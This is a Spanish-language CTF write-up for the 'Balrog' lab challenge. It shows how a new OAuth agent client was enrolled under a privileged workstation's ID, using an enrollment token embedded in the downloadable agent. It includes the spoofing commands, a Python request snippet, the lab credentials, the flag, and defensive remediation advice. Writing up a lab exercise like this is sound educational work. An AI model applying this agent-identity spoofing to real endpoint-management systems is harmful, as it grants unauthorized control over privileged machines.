# Balrog — Writeup (HackLab 2026)

- **Plataforma:** HackLab / SoftwareSeguro
- **Desafío:** Balrog (ID 69, según el catálogo del repositorio)
- **Categoría:** Auth / Broken Access Control — Agent Identity Spoofing
- **Vulnerabilidades relacionadas:** CWE-863 (Incorrect Authorization), CWE-290 (Authentication Bypass by Spoofing)
- **Autor:** Lucas
- **Estado:** Orden privilegiada recibida y flag recuperada. No se documentó la validación posterior de la flag en el formulario.

> **Alcance:** únicamente la instancia educativa del CTF. El objetivo era recibir una orden simulada; no se instaló software privilegiado.

---

## 1. Enunciado y objetivo

Balrog es una consola central para administrar el software de estaciones de trabajo. Un agente instalado en cada equipo consulta al servidor y recibe órdenes de instalación. Hay un paquete privilegiado que **solo debería enviarse a estaciones autorizadas**.

El desafío proporciona acceso de consulta a la consola con las credenciales `Balrog / BalrogPass@123` y permite descargar un ejecutable Linux:

~~~bash
./agente <url-de-la-instancia>
~~~

**Objetivo:** lograr que el servidor entregue al agente una orden para instalar el software privilegiado y extraer el código único incluido en ella.

## 2. Reconocimiento: identificar la categoría sin buscar soluciones

Inicialmente consideramos **IDOR / Broken Access Control**, **suplantación de identidad de agente**, **Authentication Bypass** y **Parameter Tampering**. No había evidencia de SQLi o XSS.

### 2.1. Pista en el HTML

En el código fuente de la consola encontramos:

~~~html
<!-- legacy: /api/v1/agents/debug — remover antes de producción -->
~~~

La consulta `GET /api/v1/agents/debug` devolvió:

~~~json
{"status":"ok","build":"dev"}
~~~

El endpoint confirma que existe una ruta de depuración, pero **no fue el vector de explotación**. El frontend también utilizaba `Authorization: Bearer mock-jwt` para consultas administrativas; ese encabezado no demostró ser equivalente a la autenticación del agente.

### 2.2. Enumeración de estaciones

`GET /api/v1/stations` respondió con una lista de estaciones y un atributo `privileged`. De las 25 estaciones observadas, la única marcada como privilegiada era **PC-02**:

~~~json
{
  "stationId": "7c1e5a3b-4d2f-4b8e-9a61-0f3d2c8b7e54",
  "physicalStationId": "0360e00a-1299-4c0b-a84a-e5cabfde18db",
  "physicalStationName": "PC-02",
  "hostname": "PC-02",
  "platform": "windows11",
  "classroomName": "Aula 02",
  "privileged": true
}
~~~

**Dato clave:** la API exponía tanto `stationId` como `physicalStationId`. Anotamos ambos, sin asumir todavía cuál validaba el servidor.

## 3. Análisis del agente Linux

Descargamos el ejecutable `agente` desde la consola. El análisis estático del archivo identificó un programa Python 3.12 empaquetado con **PyInstaller**. Entre las rutas y componentes recuperados estaban:

| Ruta | Propósito |
| --- | --- |
| `POST /api/v1/oauth/register` | Registrar un cliente OAuth asociado a una estación física |
| `POST /api/v1/oauth/token` | Obtener un access token |
| `POST /api/v1/agents/channel` | Solicitar órdenes de instalación |

El agente utilizaba criptografía **Ed25519** para firmar una aserción JWT en el flujo OAuth `private_key_jwt`.

También identificamos las variables de configuración:

- `SBM_AGENT_PHYSICAL_STATION_ID`: identidad de estación física declarada por el agente.
- `SBM_AGENT_INITIAL_ACCESS_TOKEN`: token inicial de enrolamiento; el binario contenía el valor `sbm-enroll-7f3a9c2e4b1d`.
- `SBM_AGENT_KEY_PATH`: ruta de la clave privada del agente.
- `SBM_AGENT_HOSTNAME`: nombre del host declarado.

El valor de estación predeterminado correspondía a **PC-01**, una estación **no privilegiada**:

~~~text
1d9693f8-c6e4-4a0d-b71d-f1801c80a1b8
~~~

### Hipótesis

El registro OAuth podría demostrar correctamente la posesión de una clave privada **sin comprobar que quien se registra está autorizado a representar el `physicalStationId` declarado**. Si esa asociación se aceptaba, una credencial nueva podía recibir los permisos de PC-02.

## 4. Explotación paso a paso

### Paso 1 — Crear una clave privada de agente

Desde Ubuntu/WSL generamos una clave Ed25519:

~~~bash
mkdir -p ~/.sbm-agent
openssl genpkey -algorithm Ed25519 -out ~/.sbm-agent/key
chmod 600 ~/.sbm-agent/key
chmod +x "./agente (1)"
~~~

### Paso 2 — Suplantar el identificador físico de PC-02

En lugar del identificador de PC-01, declaramos el `physicalStationId` observado en la respuesta de la API:

~~~bash
SBM_AGENT_PHYSICAL_STATION_ID="0360e00a-1299-4c0b-a84a-e5cabfde18db" \
SBM_AGENT_HOSTNAME="PC-02" \
SBM_AGENT_INITIAL_ACCESS_TOKEN="sbm-enroll-7f3a9c2e4b1d" \
SBM_AGENT_KEY_PATH="$HOME/.sbm-agent/key" \
"./agente (1)" "https://<instancia>-balrog.softwareseguro.com.ar"
~~~

**Salida observada:**

~~~text
[agente] credencial cargada desde /home/lucas/.sbm-agent/key
[agente] registrado como cliente sbm-e997c12e0d5444148fac42be374ce396 (estacion 0360e00a-1299-4c0b-a84a-e5cabfde18db)
[agente] access_token obtenido
[agente] consultando el canal HTTP
[agente] RemediationOrder 2c0c20f3-94ba-4a8f-acc1-cff56cd29c77 recibida
[agente] (mock) instalacion simulada
~~~

**Resultado:** el servidor aceptó el registro OAuth del cliente nuevo para PC-02, emitió un access token y entregó una orden. Sin embargo, el agente solo mostró el ID de la orden, no su contenido.

### Paso 3 — Obtener el JSON completo del canal

La orden no apareció en la vista de **Inventory → Orders** de la consola. Para observar el contenido sin depender de esa interfaz, reprodujimos el protocolo OAuth con un script propio `ver_orden.py`.

El flujo fue:

1. Cargar la clave privada Ed25519 y derivar la clave pública en formato JWK.
2. Registrar esa clave para el `physicalStationId` de PC-02 mediante `/api/v1/oauth/register`.
3. Firmar una aserción JWT con `iss` y `sub` iguales al `client_id` recibido, y `aud` apuntando a `/api/v1/oauth/token`.
4. Solicitar un `access_token` con `grant_type=client_credentials` y `client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer`.
5. Enviar `AgentHello` al canal y mostrar toda la respuesta JSON.

Fragmento central de la petición al canal, **después de obtener el token OAuth**:

~~~python
response = requests.post(
    BASE + "/api/v1/agents/channel",
    headers={"Authorization": f"Bearer {token}"},
    json={
        "type": "AgentHello",
        "messageId": str(uuid.uuid4()),
        "hostname": "PC-02",
        "platform": "windows11",
        "agentVersion": "1.0.0",
        "metadata": {
            "os": "Windows 11",
            "agent": "sbm-reference-agent",
        },
    },
    timeout=35,
)
print(json.dumps(response.json(), indent=2, ensure_ascii=False))
~~~

La ejecución real de `python3 ver_orden.py` confirmó:

~~~text
[+] Registrado: sbm-1e7347024ff145f4a48e955001e52820
[+] OAuth autenticado

========== RESPUESTA COMPLETA ==========
~~~

En la respuesta apareció la orden para la estación privilegiada:

~~~json
{
  "orders": [
    {
      "type": "RemediationOrder",
      "orderId": "2c0c20f3-94ba-4a8f-acc1-cff56cd29c77",
      "stationId": "7c1e5a3b-4d2f-4b8e-9a61-0f3d2c8b7e54",
      "plannedActions": [
        {
          "type": "Install",
          "softwareId": "sbm-privileged-tools",
          "approvedVersion": "1.0.0",
          "wingetId": "SBM.PrivilegedTools",
          "sourceName": "winget",
          "payload": {
            "flag": "23950b8ae6d87cbc1bee8354698995b2"
          }
        }
      ]
    }
  ]
}
~~~

El JSON anterior es un **extracto fiel de los campos relevantes** de la respuesta recibida: la orden original contenía además `messageId`, `issuedAt`, `lineaBaseId` y otros metadatos de instalación.

## 5. Resultado / Flag

La instalación era simulada: el objetivo era **recibir la orden**, no ejecutar un instalador.

**Paquete privilegiado:** `sbm-privileged-tools`  
**Ubicación del código:** `orders[0].plannedActions[0].payload.flag`

~~~text
23950b8ae6d87cbc1bee8354698995b2
~~~

La flag fue recuperada directamente del servidor. No consta en esta bitácora una captura del formulario final aceptándola.

## 6. Causa raíz

La falla observada no consistió en falsificar una firma JWT. El servidor **sí aceptó una firma hecha con una clave privada que controlábamos**, después de que registramos su clave pública.

El problema es anterior: el **proceso de enrolamiento permitió asociar un cliente OAuth nuevo a la estación PC-02 a partir de un identificador de estación controlado por el solicitante** y un token inicial presente en el agente. Esa asociación se tradujo en autorización efectiva cuando consultamos el canal.

Esto es **Broken Access Control por suplantación de identidad de agente**, con una falla en la vinculación entre **credencial autenticada** y **dispositivo autorizado**. También ilustra por qué la autenticación criptográfica por sí sola no garantiza autorización correcta.

## 7. Remediación defensiva

1. **Vincular identidad y dispositivo del lado del servidor.** No permitir que un agente recién registrado elija arbitrariamente una estación privilegiada solo enviando su UUID.
2. **Usar credenciales de enrolamiento específicas por dispositivo**, de un solo uso y con expiración breve; no distribuir un token compartido fijo dentro del binario.
3. **Acreditar el dispositivo durante el enrolamiento** mediante un mecanismo apropiado (por ejemplo, certificados de dispositivo provisionados previamente) antes de asociarle una identidad física.
4. **Aplicar autorización en `/api/v1/agents/channel`**: verificar que el cliente autenticado esté autorizado para esa estación y las órdenes que se le entregan.
5. **Registrar y alertar sobre enrolamientos anómalos**, especialmente múltiples clientes vinculados a una estación con `privileged: true`.
6. **Minimizar información expuesta** por la consola de consulta y retirar endpoints de depuración innecesarios. Esto no reemplaza la autorización del backend.

## 8. Herramientas utilizadas

- **Chrome DevTools / tráfico HTTP:** reconocimiento de rutas y enumeración de estaciones.
- **Análisis estático de binarios:** identificación de PyInstaller, cadenas, endpoints y variables de entorno del agente.
- **Ubuntu/WSL y OpenSSL:** generación de clave privada Ed25519 y ejecución del agente.
- **Python 3**, `requests` y `cryptography`: reproducción del flujo OAuth y lectura del JSON completo.

## 9. Lecciones aprendidas

- En un CTF sin categoría, la combinación **estaciones privilegiadas + agente descargable + identificadores manipulables** orienta a investigar controles de acceso e identidad.
- Hay que distinguir **`stationId` de `physicalStationId`**: en este reto el segundo fue el dato determinante durante el registro.
- Un JWT firmado correctamente solo prueba **posesión de la clave**, no que la clave corresponda a un dispositivo autorizado.
- Si el cliente oculta campos de una respuesta, reproducir el protocolo permite inspeccionar la evidencia original.
- La pista del endpoint `debug` sirvió para reconocimiento, pero no se necesitó explotarla para completar el objetivo.

---

*Writeup elaborado a partir de las peticiones, respuestas y pruebas realizadas en la propia instancia del desafío, sin recurrir a soluciones externas de Balrog.*